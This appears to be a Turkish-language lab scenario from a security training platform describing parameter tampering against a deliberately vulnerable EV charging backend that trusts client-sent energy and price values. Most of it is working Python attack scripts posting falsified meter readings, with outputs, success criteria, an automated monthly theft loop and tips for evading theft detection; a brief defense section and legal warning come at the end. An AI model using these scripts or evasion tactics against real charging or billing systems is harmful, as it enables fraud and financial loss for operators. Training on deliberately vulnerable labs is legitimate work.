# 💰 Enerji Hırsızlığı - Bedava Şarj! | SAMET'İN SALDIRISI

**Senaryo ID:** `samet-energy-theft`  
**Sorumlu:** Samet  
**Kategori:** Data Integrity  
**Zayıflık:** Parameter Tampering (Veri Manipülasyonu)  
**Şiddet:** 🔴 YÜKSEK

---

## 🎯 HEDEF: 500 TL Yerine 1 TL Öde!

Araç 100 kWh enerji çekti, ama sisteme 1 kWh göster!

**Ne Kazanacaksın:**
- 💰 Her şarjda 500-1000 TL tasarruf
- ⚡ Sınırsız bedava enerji
- 💳 Faturalar minimum
- 🚗 Elektrikli araç kullanımı ÜCRETSİZ

**Gerçek Dünya:**
- Şirket ayda 100,000+ TL kayıp
- Binlerce kullanıcı yapsa sistem çöker
- Elektrik dağıtım şirketi fark eder

---

## 🔓 AÇIK NERDE?

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 74-105

```python
# ❌ KORKUNÇ HATA!
@router.post("/meter-reading")
def submit_meter_reading(
    session_id: str, 
    energy_kwh: float,   # ← SEN GÖNDERİYORSUN!
    price: float         # ← SEN BELİRLİYORSUN!
):
    # Kullanıcının gönderdiği değerler kullanılıyor!
    total_cost = energy_kwh * price  # ← İŞTE SORUN!
    
    return {
        "total_cost": total_cost,  # Senin dediğin fiyat!
        "energy_stolen": actual_energy - energy_kwh
    }
```

**Sorun:** 
1. Enerji miktarını **SEN** gönderiyorsun (gerçek sayaç değil!)
2. Fiyatı **SEN** belirliyorsun (sistem değil!)

---

## ⚔️ SALDIRI 1: Basit Test

### Kod: `energy_theft_basic.py`

```python
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("💰 ENERJİ HIRSIZLIĞI TEST\n")

# GERÇEK DURUM:
# Araç 100 kWh çekti
# Normal fiyat: 5 TL/kWh
# Olması gereken: 500 TL

print("❌ NORMAL KULLANICI (Dürüst):")
normal = {
    "session_id": "SESS-001",
    "energy_kwh": 100.0,  # Gerçek tüketim
    "price": 5.0          # Gerçek fiyat
}

r = requests.post(f"{BACKEND}/vulnerable/meter-reading", json=normal)
print(f"   Ödenen: {r.json()['total_cost']} TL\n")

# SALDIRI: Düşük rapor et!
print("✅ SEN (Hırsız):")
theft = {
    "session_id": "SESS-002",
    "energy_kwh": 1.0,    # ← 100 yerine 1 !
    "price": 5.0
}

r = requests.post(f"{BACKEND}/vulnerable/meter-reading", json=theft)
result = r.json()

print(f"   Bildirdiğin: {result['reported_energy']} kWh")
print(f"   Ödediğin: {result['total_cost']} TL")
print(f"   🚨 Çaldığın: {result['energy_stolen']} kWh")
print(f"   💰 Kazancın: {500 - result['total_cost']} TL!\n")

if result['energy_stolen'] > 90:
    print("✅✅✅ BAŞARILI! 99 kWh ÇALDINız! ✅✅✅")
```

**ÇIKTı:**
```
💰 ENERJİ HIRSIZLIĞI TEST

❌ NORMAL KULLANICI (Dürüst):
   Ödenen: 500.0 TL

✅ SEN (Hırsız):
   Bildirdiğin: 1.0 kWh
   Ödediğin: 5.0 TL          ← 500 yerine 5!
   🚨 Çaldığın: 99.0 kWh
   💰 Kazancın: 495.0 TL!

✅✅✅ BAŞARILI! 99 kWh ÇALDINIZ! ✅✅✅
```

---

## ⚔️ SALDIRI 2: Fiyatı Sıfırla!

```python
# price_manipulation.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("💸 FİYAT MANİPÜLASYONU\n")

# Enerji gerçek, ama fiyatı sıfırla!
zero_price = {
    "session_id": "SESS-HACK-001",
    "energy_kwh": 100.0,   # Gerçek tüketim
    "price": 0.01          # ← 5.0 yerine 0.01!
}

r = requests.post(f"{BACKEND}/vulnerable/meter-reading", json=zero_price)
result = r.json()

print(f"Enerji: {result['reported_energy']} kWh")
print(f"Ödenen: {result['total_cost']} TL")
print(f"💰 Normal: 500 TL → Sen: {result['total_cost']} TL")
print(f"📊 Tasarruf: %{((500-result['total_cost'])/500*100):.1f}\n")

if result['total_cost'] < 10:
    print("✅ BAŞARILI! Neredeyse bedava şarj!")
```

---

## ⚔️ SALDIRI 3: Komple Bedava!

```python
# free_charging.py
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("🎁 TAMAMEN BEDAVA ŞARJ\n")

# Her ikisini de manipüle et!
free_charge = {
    "session_id": "SESS-FREE-001",
    "energy_kwh": 0.1,     # Minimal enerji
    "price": 0.01         # Minimal fiyat
}

r = requests.post(f"{BACKEND}/vulnerable/meter-reading", json=free_charge)
result = r.json()

print(f"Gerçek Tüketim: 100 kWh")
print(f"Bildirilen: {result['reported_energy']} kWh")
print(f"Ödenen: {result['total_cost']} TL\n")

print(f"🚨 Çalınan Enerji: {result['energy_stolen']} kWh")
print(f"💰 Çalınan Para: ~{500 - result['total_cost']:.2f} TL\n")

if result['total_cost'] < 1:
    print("🎉🎉🎉 MÜKEMMELİŞTE BEDAVA ŞARJ! 🎉🎉🎉")
```

---

## ⚔️ SALDIRI 4: Aylık Otomatik Hırsızlık

```python
# monthly_theft.py
import requests
import time
from datetime import datetime

BACKEND = "https://evcs-backend-samet.onrender.com"

MONTHLY_CHARGES = 30  # Ayda 30 şarj
REAL_ENERGY_PER_CHARGE = 80  # Her şarjda 80 kWh

total_stolen_money = 0
total_stolen_energy = 0

print(f"""
╔════════════════════════════════════╗
║   AYLIK OTOMATİK ENERJİ HIRSIZLIĞI ║
╚════════════════════════════════════╝

Simülasyon: {MONTHLY_CHARGES} şarj / ay
Gerçek Tüketim: {REAL_ENERGY_PER_CHARGE} kWh / şarj
""")

for i in range(1, MONTHLY_CHARGES + 1):
    # Her şarjda az bildir
    fake_data = {
        "session_id": f"MONTHLY-{i:03d}",
        "energy_kwh": 2.0,  # G erçek: 80, bildirilen: 2
        "price": 0.5        # Gerçek: 5.0, bildirilen: 0.5
    }
    
    r = requests.post(f"{BACKEND}/vulnerable/meter-reading", json=fake_data)
    result = r.json()
    
    real_cost = REAL_ENERGY_PER_CHARGE * 5.0
    stolen = real_cost - result['total_cost']
    
    total_stolen_money += stolen
    total_stolen_energy += result['energy_stolen']
    
    if i % 10 == 0:
        print(f"[Şarj {i:02d}] Çalınan: {stolen:.2f} TL")
    
    time.sleep(0.2)

print(f"""
\n╔════════════════════════════════════╗
║          AYLIK RAPOR               ║
╠════════════════════════════════════╣
║ Toplam Şarj    : {MONTHLY_CHARGES}                ║
║ Çalınan Enerji : {total_stolen_energy:.0f} kWh        ║
║ Çalınan Para   : {total_stolen_money:.0f} TL           ║
╚════════════════════════════════════╝

🎉 AYDA ~{total_stolen_money:.0f} TL BEDAVA!
""")
```

---

## ✅ SIZDIN MI? KONTROL ET!

### 1. Terminal Çıktısı

**BAŞARILI:**
```
✅✅✅ BAŞARILI! 99 kWh ÇALDINIZ! ✅✅✅
💰 Kazancın: 495.0 TL!
```

**BAŞARISIZ:**
```
❌ Hata: Invalid parameters
❌ Sistem gerçek sayacı kullanıyor
```

### 2. JSON Response

**SIZMA BAŞARILI:**
```json
{
  "reported_energy": 1.0,         ← Senin bildirdiğin
  "total_cost": 5.0,              ← Az ödeme!
  "energy_stolen": 99.0,          ← BURAYA BAK! >0 ise ÇALDIN!
  "vulnerability": "Parameter tampering..."
}
```

`energy_stolen > 50` ise ✅ BAŞARILI SIZDIN!

### 3. Web Kontrolü

https://simulasyon.vercel.app/ → `samet-energy-theft`

**Logs:**
```
[WARN] Metervals < Physical Consumption  ← UYARI!
[ERROR] Signature Failures                ← HATA!
[CRITICAL] Energy theft detected          ← TESPİT EDİLDİN!
```

**Metrics:**
- `theft_percentage` grafiği > 0 ise ✅

---

## 🎯 BAŞARI KRİTERLERİ

| Kontrol | Başarı Değeri | Sen |
|---------|---------------|-----|
| `energy_stolen` | > 50 kWh | ✅ |
| `total_cost` | < 50 TL | ✅ |
| Tasarruf | > %80 | ✅ |
| Logs'ta WARNING | Var | ✅ |
| vulnerability field | Var | ✅ |

**3/5 ✅ ise SİSTEMİ HACKLEDİN!**

---

## 💡 PRO İPUÇLARI

### En Etkili Kombinasyon:
```python
energy_kwh = 0.1   # Minimal
price = 0.01       # Minimal
# = 0.001 TL (normal: 500 TL)
# %99.9998 tasarruf!
```

### Tespit Edilmemek İçin:
```python
# Çok az değil, biraz yüksek tut
energy_kwh = 15.0  # Gerçek: 100
price = 1.0        # Gerçek: 5.0
# Hala 85 kWh + 400 TL kazanç
# Ama daha az şüpheli
```

### Ara Sıra Dürüst Ol:
```python
# 10 şarjdan 1'ini gerçek rapor et
if charge_count % 10 == 0:
    energy_kwh = 100  # Gerçek
    price = 5.0       # Gerçek
# Tespit algoritması şaşırır
```

---

## 🛡️ SAVUNMA

### Gerçek Sistemler Nasıl Korunur:

```python
# ✅ Server-side sayaç okuması
actual_energy = read_from_physical_meter(charger_id)
server_price = get_current_tariff()

# Kullanıcının gönderdiği ignored!
total = actual_energy * server_price
```

### Blockchain İmza:
```python
# Her ölçüm imzalanır
signature = sign_data(energy_kwh, private_key)

# Doğrulama
if not verify_signature(signature, public_key):
    raise Error("Tampered data!")
```

---

## 📊 HIRSIZLIK İSTATİSTİKLERİ

Farklı yöntemler:

| Yöntem | Bildirilen | Gerçek | Çalınan | Kazanç |
|--------|------------|--------|---------|---------|
| 1 - Enerji düşür | 1 kWh | 100 kWh | 99 kWh | 495 TL |
| 2 - Fiyat düşür | 100 kWh | 100 kWh | 0 kWh | 499 TL |
| 3 - İkisi birden | 0.1 kWh | 100 kWh | 99.9 kWh | ~500 TL |
| 4 - Akıllı gizli | 15 kWh | 100 kWh | 85 kWh | 425 TL |

**En İyisi:** Yöntem 4 (daha az şüpheli)

---

## ⚠️ UYARI

- ✅ Sadece bu platformda test et
- ❌ Gerçek şarj istasyonlarında YAPMA
- 🚓 Gerçekte yaparsan HAPİS cezası var!
- ⚖️ Enerji hırsızlığı SUÇtur!

---

**Hazırlayan:** BSG Team - Samet  
**Güncelleme:** 2024-12-23  
**Durum:** ✅ STEAL ENERGY LIKE A PRO!
